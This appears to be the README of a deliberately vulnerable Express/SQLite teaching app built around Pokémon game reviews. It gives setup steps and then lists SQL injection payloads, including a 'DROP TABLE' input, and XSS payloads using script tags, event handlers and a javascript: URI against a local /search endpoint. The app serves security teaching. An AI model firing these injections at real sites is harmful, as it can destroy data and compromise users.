# Web App Vulnerable to XSS and SQL Injection

This is a small Express app used for teaching/security demonstration.

## Setup

1. Install dependencies:

```bash
npm install
```

2. Seed the SQLite database (run once):

```bash
npm run seed
```

This creates a `data/reviews.db` file and populates it with the sample `pokemonGameReviews` data from `data/reviews.js`.

3. Start the app:

```bash
npm start
```

4. Open the app in your browser:

http://localhost:3000

Search examples:

- Submit the form on the homepage.
- Or use GET: `http://localhost:3000/search?searchTerm=Gold`
- Or use curl:

```bash
curl -X POST -d "searchTerm=Gold" http://localhost:3000/search
```

## SQL Injection and XSS Attempts

SQL Injection attempts (via GET /search):

```text
# Basic SQL injection attempts
http://localhost:3000/search?searchTerm=Black' OR '1'='1
http://localhost:3000/search?searchTerm=Black' UNION SELECT 'hack','test
http://localhost:3000/search?searchTerm='; SELECT * FROM reviews; --

# More complex attempts
http://localhost:3000/search?searchTerm=' OR game LIKE '%
http://localhost:3000/search?searchTerm='; DROP TABLE reviews; --
```

XSS attempts (try both GET and POST /search):

```text
# Basic script injection
http://localhost:3000/search?searchTerm=<script>alert('xss')</script>

# Event handlers
http://localhost:3000/search?searchTerm=<img src="x" onerror="alert('xss')">
http://localhost:3000/search?searchTerm=<body onload="alert('xss')">

# More subtle attempts
http://localhost:3000/search?searchTerm=<div onmouseover="alert('xss')">hover me</div>
http://localhost:3000/search?searchTerm=javascript:alert('xss')//
```